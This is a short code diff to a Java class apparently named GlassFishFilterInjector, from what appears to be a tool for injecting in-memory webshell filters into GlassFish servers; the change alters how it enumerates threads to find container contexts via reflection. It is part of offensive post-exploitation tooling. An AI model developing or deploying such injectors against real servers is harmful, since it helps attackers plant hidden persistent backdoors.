@@ -46,7 +46,7 @@ public class GlassFishFilterInjector {
 
     public List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", null, null);
+        Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
                 Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
